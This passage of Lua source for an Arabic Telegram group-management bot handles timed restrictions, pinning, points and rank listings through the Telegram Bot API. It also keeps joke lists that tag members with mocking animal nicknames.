ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙هو جريذي شرفع منه بعد😹💔") 
else
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم رفعه في قائمة الجريذيه\n✓") 
DevAIAN:sadd(WAAD..'User:Jred:'..msg.chat_id_, result.sender_user_id_)
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,Jred_lby_reply)
end end
--     Source WAAD     --
if msg.reply_to_message_id_ ~= 0  then
if text and text:match("^تنزيل جريذي$") and not DevAIAN:get(WAAD..'AIAN:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
function Jred_lby_reply(extra, result, success)
if not DevAIAN:sismember(WAAD..'User:Jred:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙هو ليس جريذي ليتم تنزيله") 
else
DevAIAN:srem(WAAD..'User:Jred:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم تنزيله من قائمة الجريذيه\n✓") 
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,Jred_lby_reply)
end end
--     Source WAAD     --
if Admin(msg) then
if text and (text:match('^تقييد دقيقه (%d+)$') or text:match('^كتم دقيقه (%d+)$') or text:match('^تقيد دقيقه (%d+)$')) and ChCheck(msg) then 
local function mut_time(extra, result,success)
local mutept = text:match('^تقييد دقيقه (%d+)$') or text:match('^كتم دقيقه (%d+)$') or text:match('^تقيد دقيقه (%d+)$')
local Minutes = string.gsub(mutept, 'm', '')
local num1 = tonumber(Minutes) * 60 
if RankChecking(result.sender_user_id_, msg.chat_id_) then 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙لا تستطيع تقيد ↫ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md') 
else 
https.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+num1))
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم تقيده لمدة ↫ "..mutept.." د") 
DevAIAN:sadd(WAAD..'AIAN:Tkeed:'..msg.chat_id_, result.sender_user_id_)
end end 
if tonumber(msg.reply_to_message_id_) == 0 then else
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end 
end
if text and (text:match('^تقييد ساعه (%d+)$') or text:match('^كتم ساعه (%d+)$') or text:match('^تقيد ساعه (%d+)$')) and ChCheck(msg) then 
local function mut_time(extra, result,success)
local mutept = text:match('^تقييد ساعه (%d+)$') or text:match('^كتم ساعه (%d+)$') or text:match('^تقيد ساعه (%d+)$')
local hour = string.gsub(mutept, 'h', '')
local num1 = tonumber(hour) * 3600 
if RankChecking(result.sender_user_id_, msg.chat_id_) then 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙لا تستطيع تقيد ↫ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md') 
else 
https.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+num1))
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم تقيده لمدة ↫ "..mutept.." س") 
DevAIAN:sadd(WAAD..'AIAN:Tkeed:'..msg.chat_id_, result.sender_user_id_)
end end
if tonumber(msg.reply_to_message_id_) == 0 then else
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end 
end 
if text and (text:match('^تقييد يوم (%d+)$') or text:match('^كتم يوم (%d+)$') or text:match('^تقيد يوم (%d+)$')) and ChCheck(msg) then 
local function mut_time(extra, result,success)
local mutept = text:match('^تقييد يوم (%d+)$') or text:match('^كتم يوم (%d+)$') or text:match('^تقيد يوم (%d+)$')
local day = string.gsub(mutept, 'd', '')
local num1 = tonumber(day) * 86400 
if RankChecking(result.sender_user_id_, msg.chat_id_) then 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙لا تستطيع تقيد ↫ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md') 
else 
https.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+num1))
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم تقيده لمدة ↫ "..mutept.." ي") 
DevAIAN:sadd(WAAD..'AIAN:Tkeed:'..msg.chat_id_, result.sender_user_id_)
end end
if tonumber(msg.reply_to_message_id_) == 0 then else
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end 
end 
end 
--     Source WAAD     --
if text and text:match("^اضف رسائل (%d+)$") and msg.reply_to_message_id_ == 0 and ChCheck(msg) then  
if Constructor(msg) then
TXT = text:match("^اضف رسائل (%d+)$")
DevAIAN:set('WAAD:'..WAAD..'id:user'..msg.chat_id_,TXT)  
DevAIAN:setex('WAAD:'..WAAD.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)  
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙ارسل عدد الرسائل الان \n⌯︙ارسل الغاء لالغاء الامر ", 1, "md")
Dev_AIAN(msg.chat_id_, msg.id_, 1,numd, 1, 'md') 
else 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙هذا الامر للمنشئين فقط', 1, 'md') 
end 
end 
if text and text:match("^اضف رسائل (%d+)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
local Num = text:match("^اضف رسائل (%d+)$")
function Reply(extra, result, success)
DevAIAN:del(WAAD..'AIAN:UsersMsgs'..msg.chat_id_..':'..result.sender_user_id_) 
DevAIAN:incrby(WAAD..'AIAN:UsersMsgs'..msg.chat_id_..':'..result.sender_user_id_,Num) 
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تم اضافة "..Num..' رساله', 1, 'md') 
end
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},Reply, nil)
return false
end
if text and text:match("^اضف نقاط (%d+)$") and msg.reply_to_message_id_ == 0 and ChCheck(msg) then  
if Constructor(msg) then
TXT = text:match("^اضف نقاط (%d+)$")
DevAIAN:set('WAAD:'..WAAD..'ids:user'..msg.chat_id_,TXT)  
DevAIAN:setex('WAAD:'..WAAD.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)  
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙ارسل عدد النقاط الان \n⌯︙ارسل الغاء لالغاء الامر ", 1, "md")
Dev_AIAN(msg.chat_id_, msg.id_, 1,numd, 1, 'md') 
else 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙هذا الامر للمنشئين فقط', 1, 'md') 
end 
end 
if text and text:match("^اضف نقاط (%d+)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
local Num = text:match("^اضف نقاط (%d+)$")
function Reply(extra, result, success)
DevAIAN:incrby(WAAD..'AIAN:GamesNumber'..msg.chat_id_..result.sender_user_id_,Num) 
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تم اضافة "..Num..' نقطه', 1, 'md') 
end
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},Reply, nil)
return false
end
if DevAIAN:get(WAAD..'AIAN:Lock:Clean'..msg.chat_id_) then if msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.photo_ or msg.content_.animation_ then if msg.reply_to_message_id_ ~= 0 then DevAIAN:sadd(WAAD.."AIAN:cleaner"..msg.chat_id_, msg.id_) else DevAIAN:sadd(WAAD.."AIAN:cleaner"..msg.chat_id_, msg.id_) end end end
if Manager(msg) and msg.reply_to_message_id_ ~= 0 then
if text and text:match("^تثبيت$") and ChCheck(msg) then 
if DevAIAN:sismember(WAAD.."AIAN:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
Dev_AIAN(msg.chat_id_,msg.id_, 1, "⌯︙التثبيت والغاء واعادة التثبيت تم قفله من قبل المنشئين الاساسيين", 1, 'md')
return false  
end
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub("-100",""),message_id_ = msg.reply_to_message_id_,disable_notification_ = 1},function(arg,data) 
if data.ID == "Ok" then
DevAIAN:set(WAAD..'AIAN:PinnedMsg'..msg.chat_id_,msg.reply_to_message_id_)
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تثبيت الرسالة")
return false  
end
if data.code_ == 6 then
Dev_AIAN(msg.chat_id_, msg.id_, 1,'⌯︙البوت ليس ادمن هنا !', 1, 'md')
return false  
end
if data.message_ == "CHAT_ADMIN_REQUIRED" then
Dev_AIAN(msg.chat_id_, msg.id_, 1,'⌯︙ليست لدي صلاحية التثبيت يرجى التحقق من الصلاحيات', 1, 'md')
return false  
end
end,nil)
end 
end
--     Source WAAD     --
if Admin(msg) then
if text == "المميزين" and ChCheck(msg) then 
local List = DevAIAN:smembers(WAAD..'AIAN:VipMem:'..msg.chat_id_)
text = "⌯︙قائمة المميزين ↫ ⤈ \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n"
for k,v in pairs(List) do
local username = DevAIAN:get(WAAD..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "⌯︙*لا يوجد مميزين*"
end
Dev_AIAN(msg.chat_id_, msg.id_, 1, text, 1, "md")
end end 
--     Source WAAD     --
if Manager(msg) then
if text == "الادمنيه" and ChCheck(msg) or text == "الادمنية" and ChCheck(msg) then 
local AIAN =  'AIAN:Admins:'..msg.chat_id_
local List = DevAIAN:smembers(WAAD..AIAN)
text = "⌯︙قائمة الادمنيه ↫ ⤈ \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n"
for k,v in pairs(List) do
local username = DevAIAN:get(WAAD..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then
text = "⌯︙*لا يوجد ادمنيه*"
end
Dev_AIAN(msg.chat_id_, msg.id_, 1, text, 1, "md")
end end
--     Source WAAD     -- 
if Constructor(msg) then
if text == "المدراء" and ChCheck(msg) or text == "مدراء" and ChCheck(msg) then 
local List = DevAIAN:smembers(WAAD..'AIAN:Managers:'..msg.chat_id_)
text = "⌯︙قائمة المدراء ↫ ⤈ \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n"
for k,v in pairs(List) do
local username = DevAIAN:get(WAAD..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "⌯︙*لا يوجد مدراء*"
end
Dev_AIAN(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
if text == "المنظفين" and ChCheck(msg) then 
local List = DevAIAN:smembers(WAAD..'AIAN:Cleaner:'..msg.chat_id_)
text = "⌯︙قائمة المنظفين ↫ ⤈ \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n"
for k,v in pairs(List) do
local username = DevAIAN:get(WAAD..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "⌯︙*لا يوجد منظفين*"
end
Dev_AIAN(msg.chat_id_, msg.id_, 1, text, 1, "md")
end end 
--     Source WAAD     --
if BasicConstructor(msg) then
if text == "المنشئين" and ChCheck(msg) then 
local List = DevAIAN:smembers(WAAD..'AIAN:Constructor:'..msg.chat_id_)
text = "⌯︙قائمة المنشئين ↫ ⤈ \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n"
for k,v in pairs(List) do
local username = DevAIAN:get(WAAD..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "⌯︙*لا يوجد منشئين*"
end
Dev_AIAN(msg.chat_id_, msg.id_, 1, text, 1, "md")
end end 
--     Source WAAD     --
if AIANConstructor(msg) then
if text == "المالكين" and ChCheck(msg) then 
local List = DevAIAN:smembers(WAAD..'AIAN:AIANConstructor:'..msg.chat_id_)
text = "⌯︙قائمة المالكين ↫ ⤈ \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n"
for k,v in pairs(List) do
local username = DevAIAN:get(WAAD..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "⌯︙*لا يوجد مالكين*"
end
Dev_AIAN(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
if text == "المنشئين الاساسيين" and ChCheck(msg) or text == "منشئين اساسيين" and ChCheck(msg) or text == "المنشئين الاساسين" and ChCheck(msg) then 
local List = DevAIAN:smembers(WAAD..'AIAN:BasicConstructor:'..msg.chat_id_)
text = "⌯︙قائمة المنشئين الاساسيين ↫ ⤈ \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n"
for k,v in pairs(List) do
local username = DevAIAN:get(WAAD..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "⌯︙*لا يوجد منشئين اساسيين*"
end
Dev_AIAN(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
end 
if text ==("المنشئ") and ChCheck(msg) or text ==("المالك") and ChCheck(msg) then
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
Manager_id = admins[i].user_id_
tdcli_function ({ID = "GetUser",user_id_ = Manager_id},function(arg,dp) 
if dp.first_name_ == false then
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙حساب المنشئ محذوف", 1, "md")
return false  
end
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = dp.id_,offset_ = 0,limit_ = 1},function(extra,SoOoFi,success) 
if SoOoFi.photos_[0] then
local bio = GetBio(dp.id_,msg.chat_id_)
local UserName = (dp.username_ or "CXRCX")
local Text = '⌯︙منشئ المجموعه ↫ ['..dp.first_name_..'](T.me/'..UserName..')\n⌯︙'..bio..'\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ'
keyboard = {} 
keyboard.inline_keyboard = {{{text='• '..dp.first_name_..' •',url=("t.me/"..dp.username_ or "t.me/CXRCX")}}}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id='..msg.chat_id_..'&photo='..SoOoFi.photos_[0].sizes_[1].photo_.persistent_id_..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
SendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
end
end,nil)  
end,nil)   
end
end
end,nil)   
end
--     Source WAAD     --
if Admin(msg) then
if text == "المكتومين" and ChCheck(msg) then 
local List = DevAIAN:smembers(WAAD..'AIAN:Muted:'..msg.chat_id_)
text = "⌯︙قائمة المكتومين ↫ ⤈ \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n"
for k,v in pairs(List) do
local username = DevAIAN:get(WAAD..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "⌯︙*لا يوجد مكتومين*"
end
Dev_AIAN(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
--     Source WAAD     --
if text == "المقيدين" and ChCheck(msg) then 
local List = DevAIAN:smembers(WAAD..'AIAN:Tkeed:'..msg.chat_id_)
text = "⌯︙قائمة المقيدين ↫ ⤈ \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n"
for k,v in pairs(List) do
local username = DevAIAN:get(WAAD..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then
text = "⌯︙*لا يوجد مقيدين*"
end
Dev_AIAN(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
--     Source WAAD     --
if text == "المحظورين" and ChCheck(msg) or text == "المحضورين" and ChCheck(msg) then 
local List = DevAIAN:smembers(WAAD..'AIAN:Ban:'..msg.chat_id_)
text = "⌯︙قائمة المحظورين ↫ ⤈ \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n"
for k,v in pairs(List) do
local username = DevAIAN:get(WAAD..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "⌯︙*لا يوجد محظورين*"
end
Dev_AIAN(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
if text == "قائمه المنع" and ChCheck(msg) then
local List = DevAIAN:hkeys(WAAD..'AIAN:Filters:'..msg.chat_id_)
text = "⌯︙قائمة المنع ↫ ⤈ \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n"
for k, v in pairs(List) do
text = text..k..'~ ❨ '..v..' ❩\n'
end
if #List == 0 then
text = "⌯︙لا توجد كلمات ممنوعه"
end
Dev_AIAN(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
end 
--     Source WAAD     --
if text == "المطايه" and ChCheck(msg) or text == "المطاية" and ChCheck(msg) then
local List = DevAIAN:smembers(WAAD..'User:Donky:'..msg.chat_id_)
text = "⌯︙قائمة مطاية المجموعه 😹💔 ↫ ⤈ \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n"
for k,v in pairs(List) do
local username = DevAIAN:get(WAAD..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then
text = "⌯︙*لا يوجد مطايه كلها اوادم* 😹💔"
end
Dev_AIAN(msg.chat_id_, msg.id_, 1, text, 1, "md")
end
--     Source WAAD     --
if text == "الحاتات" and ChCheck(msg) or text == "حاتات" and ChCheck(msg) then
local List = DevAIAN:smembers(WAAD..'User:HaTa:'..msg.chat_id_)
text = "⌯︙قائمة حاتات المجموعه 😹💔 ↫ ⤈ \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ \n"
for k,v in pairs(List) do
local username = DevAIAN:get(WAAD..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #List == 0 then
text = "⌯︙*لا يوجد حاتات كلهن محلوات* 😹💔"
end
Dev_AIAN(msg.chat_id_, msg.id_, 1, text, 1, "md")
end
--     Source WAAD     --
if text == "الصاكين" and ChCheck(msg) or text == "صاكين" and ChCheck(msg) then
local List = DevAIAN:smembers(WAAD..'User:hlo:'..msg.chat_id_)
text = "⌯︙قائمة صاكين المجموعه 😹💔 ↫ ⤈ \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ \n"
for k,v in pairs(List) do
local username = DevAIAN:get(WAAD..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #List == 0 then
text = "⌯︙*لا يوجد صاكين كلهم جكمين* 😹💔"
end
Dev_AIAN(msg.chat_id_, msg.id_, 1, text, 1, "md")
end
--     Source WAAD     --
if text == "الصخوله" and ChCheck(msg) or text == "صخولة" and ChCheck(msg) then
local List = DevAIAN:smembers(WAAD..'User:Sakl:'..msg.chat_id_)
text = "⌯︙قائمة الصخوله المجموعه 😹💔 ↫ ⤈ \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ \n"
for k,v in pairs(List) do
local username = DevAIAN:get(WAAD..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #List == 0 then
text = "⌯︙*لا يوجد الصخوله كلهم جكمين* 😹💔"
end
Dev_AIAN(msg.chat_id_, msg.id_, 1, text, 1, "md")
end
--     Source WAAD     --
if text == "الجلاب" and ChCheck(msg) or text == "جلاب" and ChCheck(msg) then
local List = DevAIAN:smembers(WAAD..'User:Dog:'..msg.chat_id_)
text = "⌯︙قائمة الجلاب المجموعه 😹💔 ↫ ⤈ \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ \n"
for k,v in pairs(List) do
local username = DevAIAN:get(WAAD..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #List == 0 then
text = "⌯︙*لا يوجد جلاب كلهم ملقحين* 😹💔"
end
Dev_AIAN(msg.chat_id_, msg.id_, 1, text, 1, "md")
end
--     Source WAAD     --
if text == "القورده" and ChCheck(msg) or text == "قروده" and ChCheck(msg) then
local List = DevAIAN:smembers(WAAD..'User:Monkey:'..msg.chat_id_)
text = "⌯︙قائمة القورده المجموعه 😹💔 ↫ ⤈ \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ \n"
for k,v in pairs(List) do
local username = DevAIAN:get(WAAD..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #List == 0 then
text = "⌯︙*لا يوجد قروده كلهم مؤدبين* 😹💔"
end
Dev_AIAN(msg.chat_id_, msg.id_, 1, text, 1, "md")
end
--     Source WAAD     --
if text == "الضلوع" and ChCheck(msg) or text == "ضلوعي" and ChCheck(msg) then
local List = DevAIAN:smembers(WAAD..'User:Bro:'..msg.chat_id_)
text = "⌯︙قائمة الضلوع المجموعه 😹💔 ↫ ⤈ \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ \n"
for k,v in pairs(List) do
local username = DevAIAN:get(WAAD..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #List == 0 then
text = "⌯︙*لا يوجد ضلوع راحو وي الطيبين* 😹💔"
end
Dev_AIAN(msg.chat_id_, msg.id_, 1, text, 1, "md")
end
--     Source WAAD     --
if text == "الضلعات" and ChCheck(msg) or text == "ضلعاتي" and ChCheck(msg) then
local List = DevAIAN:smembers(WAAD..'User:Bro:Girl'..msg.chat_id_)
text = "⌯︙قائمة الضلعات المجموعه 😹💔 ↫ ⤈ \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ \n"
for k,v in pairs(List) do
local username = DevAIAN:get(WAAD..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #List == 0 then
text = "⌯︙*لا يوجد ضلعات كلهن برابيك* 😹💔"
end
Dev_AIAN(msg.chat_id_, msg.id_, 1, text, 1, "md")
end
--     Source WAAD     --
if text == "الهوايش" and ChCheck(msg) or text == "البقرات" and ChCheck(msg) then
local List = DevAIAN:smembers(WAAD..'User:Bakra:'..msg.chat_id_)
text = "⌯︙قائمة البقرات المجموعه 😹💔 ↫ ⤈ \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ \n"
for k,v in pairs(List) do
local username = DevAIAN:get(WAAD..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #List == 0 then
text = "⌯︙*لا يوجد بقرات كلهن ضعيفات ومبيهن حليب* 😹💔"
end
Dev_AIAN(msg.chat_id_, msg.id_, 1, text, 1, "md")
end
--     Source WAAD     --
if text == "الطليان" and ChCheck(msg) or text == "طليان" and ChCheck(msg) then
local List = DevAIAN:smembers(WAAD..'User:Tale:'..msg.chat_id_)
text = "⌯︙قائمة طليان المجموعه 😹💔 ↫ ⤈ \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ \n"
for k,v in pairs(List) do
local username = DevAIAN:get(WAAD..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #List == 0 then
text = "⌯︙*لا يوجد طليان كلهم نغوله مينقطون* 😹💔"
end
Dev_AIAN(msg.chat_id_, msg.id_, 1, text, 1, "md")
end
--     Source WAAD     --
if text == "الزواحف" and ChCheck(msg) or text == "زواحف" and ChCheck(msg) then
local List = DevAIAN:smembers(WAAD..'User:Zahf:'..msg.chat_id_)
text = "⌯︙قائمة زواحف المجموعه 😹💔 ↫ ⤈ \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ \n"
for k,v in pairs(List) do
local username = DevAIAN:get(WAAD..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #List == 0 then
text = "⌯︙*لا يوجد زواحف كلهم ثكال* 😹💔"
end
Dev_AIAN(msg.chat_id_, msg.id_, 1, text, 1, "md")
end
--     Source WAAD     --
if text == "الجريذيه" and ChCheck(msg) or text == "جريذيه" and ChCheck(msg) then
local List = DevAIAN:smembers(WAAD..'User:Jred:'..msg.chat_id_)
text = "⌯︙قائمة الجريذيه المجموعه 😹💔 ↫ ⤈ \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ \n"
for k,v in pairs(List) do
local username = DevAIAN:get(WAAD..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #List == 0 then
text = "⌯︙*لا يوجد جريذيه* 😹💔"
end
Dev_AIAN(msg.chat_id_, msg.id_, 1, text, 1, "md")
end
--     Source WAAD     --
if text == "المطورين الثانويين" and SecondSudo(msg) or text == "الثانويين" and SecondSudo(msg) or text == "↫ الثانويين ⌯" and SecondSudo(msg) then 
local List = DevAIAN:smembers(WAAD..'AIAN:SecondSudo:')
text = "⌯︙قائمة المطورين الثانويين ↫ ⤈ \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n"
for k,v in pairs(List) do
local username = DevAIAN:get(WAAD..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then
text = "⌯︙*عذرا لم يتم رفع اي مطورين ثانويين*"
end
Dev_AIAN(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
--     Source WAAD     --
if SudoBot(msg) then
if text == "قائمه العام" and ChCheck(msg) or text == "المحظورين عام" and ChCheck(msg) or text == "المكتومين عام" and ChCheck(msg) or text == "↫ قائمه العام ⌯" and ChCheck(msg) then 
local BanAll = DevAIAN:smembers(WAAD..'AIAN:BanAll:')
local MuteAll = DevAIAN:smembers(WAAD..'AIAN:MuteAll:')
if #BanAll ~= 0 then 
text = "⌯︙قائمة المحظورين عام ↫ ⤈ \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n"
for k,v in pairs(BanAll) do
local username = DevAIAN:get(WAAD..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
else
text = ""
end
if #MuteAll ~= 0 then 
text = text.."⌯︙قائمة المكتومين عام ↫ ⤈ \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n"
for k,v in pairs(MuteAll) do
local username = DevAIAN:get(WAAD..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
else
text = text
end
if #BanAll ~= 0 or #MuteAll ~= 0 then 
text = text
else
text = "⌯︙*لم يتم حظر او كتم اي عضو*"
end
Dev_AIAN(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
--     Source WAAD     --
if text == "المطورين" and ChCheck(msg) or text == "↫ المطورين  ⌯" and ChCheck(msg) then 
local List = DevAIAN:smembers(WAAD..'AIAN:SudoBot:')
text = "⌯︙قائمة المطورين ↫ ⤈ \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n"
for k,v in pairs(List) do
local sudouser = DevAIAN:get(WAAD..'AIAN:Sudos'..v) 
local username = DevAIAN:get(WAAD..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."] ↬ Gps : "..(sudouser or 0).."\n"
else
text = text..k.."~ : `"..v.."` ↬ Gps : "..(sudouser or 0).."\n"
end end
if #List == 0 then
text = "⌯︙*عذرا لم يتم رفع اي مطورين*"
end
Dev_AIAN(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
--     Source WAAD     --
if text == "المدراء العامين" and ChCheck(msg) then 
local List = DevAIAN:smembers(WAAD..'AIAN:ManagerAll:')
text = "⌯︙قائمة المدراء العامين ↫ ⤈ \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n"
for k,v in pairs(List) do
local username = DevAIAN:get(WAAD..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "⌯︙*لا يوجد مدراء عامين*"
end
Dev_AIAN(msg.chat_id_, msg.id_, 1, text, 1, "md")
end
